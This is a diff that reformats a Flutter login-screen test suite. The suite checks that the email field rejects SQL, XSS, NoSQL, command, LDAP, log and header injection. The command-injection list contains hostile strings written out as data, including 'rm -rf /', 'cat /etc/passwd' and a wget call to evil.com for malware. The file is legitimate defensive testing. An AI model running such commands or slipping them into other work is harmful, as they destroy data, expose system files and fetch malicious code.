@@ -217,14 +217,8 @@ void main() {
         ];
 
         for (final pattern in sqlInjectionPatterns) {
-          await tester.enterText(
-            find.byType(TextFormField).first,
-            pattern,
-          );
-          await tester.enterText(
-            find.byType(TextFormField).last,
-            'senha123',
-          );
+          await tester.enterText(find.byType(TextFormField).first, pattern);
+          await tester.enterText(find.byType(TextFormField).last, 'senha123');
 
           await tester.tap(find.text('Entrar'));
           await tester.pump();
@@ -256,14 +250,8 @@ void main() {
         ];
 
         for (final pattern in xssPatterns) {
-          await tester.enterText(
-            find.byType(TextFormField).first,
-            pattern,
-          );
-          await tester.enterText(
-            find.byType(TextFormField).last,
-            'senha123',
-          );
+          await tester.enterText(find.byType(TextFormField).first, pattern);
+          await tester.enterText(find.byType(TextFormField).last, 'senha123');
 
           await tester.tap(find.text('Entrar'));
           await tester.pump();
@@ -295,14 +283,8 @@ void main() {
         ];
 
         for (final pattern in nosqlInjectionPatterns) {
-          await tester.enterText(
-            find.byType(TextFormField).first,
-            pattern,
-          );
-          await tester.enterText(
-            find.byType(TextFormField).last,
-            'senha123',
-          );
+          await tester.enterText(find.byType(TextFormField).first, pattern);
+          await tester.enterText(find.byType(TextFormField).last, 'senha123');
 
           await tester.tap(find.text('Entrar'));
           await tester.pump();
@@ -319,44 +301,39 @@ void main() {
         }
       });
 
-      testWidgets('deve rejeitar tentativas de command injection no campo email', (
-        WidgetTester tester,
-      ) async {
-        await tester.pumpWidget(createLoginScreen());
+      testWidgets(
+        'deve rejeitar tentativas de command injection no campo email',
+        (WidgetTester tester) async {
+          await tester.pumpWidget(createLoginScreen());
 
-        // Testa diferentes padrões de command injection
-        final commandInjectionPatterns = [
-          'test@test.com; rm -rf /',
-          'test@test.com && cat /etc/passwd',
-          'test@test.com | ls -la',
-          'test@test.com; echo "malicious" > /tmp/hack',
-          'test@test.com && wget http://evil.com/malware',
-        ];
+          // Testa diferentes padrões de command injection
+          final commandInjectionPatterns = [
+            'test@test.com; rm -rf /',
+            'test@test.com && cat /etc/passwd',
+            'test@test.com | ls -la',
+            'test@test.com; echo "malicious" > /tmp/hack',
+            'test@test.com && wget http://evil.com/malware',
+          ];
 
-        for (final pattern in commandInjectionPatterns) {
-          await tester.enterText(
-            find.byType(TextFormField).first,
-            pattern,
-          );
-          await tester.enterText(
-            find.byType(TextFormField).last,
-            'senha123',
-          );
+          for (final pattern in commandInjectionPatterns) {
+            await tester.enterText(find.byType(TextFormField).first, pattern);
+            await tester.enterText(find.byType(TextFormField).last, 'senha123');
 
-          await tester.tap(find.text('Entrar'));
-          await tester.pump();
+            await tester.tap(find.text('Entrar'));
+            await tester.pump();
 
-          // Deve mostrar erro de email inválido, não executar comandos
-          expect(
-            find.text('Por favor, insira um e-mail válido'),
-            findsOneWidget,
-          );
+            // Deve mostrar erro de email inválido, não executar comandos
+            expect(
+              find.text('Por favor, insira um e-mail válido'),
+              findsOneWidget,
+            );
 
-          // Limpa os campos para o próximo teste
-          await tester.enterText(find.byType(TextFormField).first, '');
-          await tester.enterText(find.byType(TextFormField).last, '');
-        }
-      });
+            // Limpa os campos para o próximo teste
+            await tester.enterText(find.byType(TextFormField).first, '');
+            await tester.enterText(find.byType(TextFormField).last, '');
+          }
+        },
+      );
 
       testWidgets('deve rejeitar tentativas de LDAP injection no campo email', (
         WidgetTester tester,
@@ -373,14 +350,8 @@ void main() {
         ];
 
         for (final pattern in ldapInjectionPatterns) {
-          await tester.enterText(
-            find.byType(TextFormField).first,
-            pattern,
-          );
-          await tester.enterText(
-            find.byType(TextFormField).last,
-            'senha123',
-          );
+          await tester.enterText(find.byType(TextFormField).first, pattern);
+          await tester.enterText(find.byType(TextFormField).last, 'senha123');
 
           await tester.tap(find.text('Entrar'));
           await tester.pump();
@@ -416,10 +387,7 @@ void main() {
             find.byType(TextFormField).first,
             pattern + '@test.com',
           );
-          await tester.enterText(
-            find.byType(TextFormField).last,
-            'senha123',
-          );
+          await tester.enterText(find.byType(TextFormField).last, 'senha123');
 
           await tester.tap(find.text('Entrar'));
           await tester.pump();
@@ -451,14 +419,8 @@ void main() {
         ];
 
         for (final pattern in logInjectionPatterns) {
-          await tester.enterText(
-            find.byType(TextFormField).first,
-            pattern,
-          );
-          await tester.enterText(
-            find.byType(TextFormField).last,
-            'senha123',
-          );
+          await tester.enterText(find.byType(TextFormField).first, pattern);
+          await tester.enterText(find.byType(TextFormField).last, 'senha123');
 
           await tester.tap(find.text('Entrar'));
           await tester.pump();
@@ -490,14 +452,8 @@ void main() {
         ];
 
         for (final pattern in headerInjectionPatterns) {
-          await tester.enterText(
-            find.byType(TextFormField).first,
-            pattern,
-          );
-          await tester.enterText(
-            find.byType(TextFormField).last,
-            'senha123',
-          );
+          await tester.enterText(find.byType(TextFormField).first, pattern);
+          await tester.enterText(find.byType(TextFormField).last, 'senha123');
 
           await tester.tap(find.text('Entrar'));
           await tester.pump();
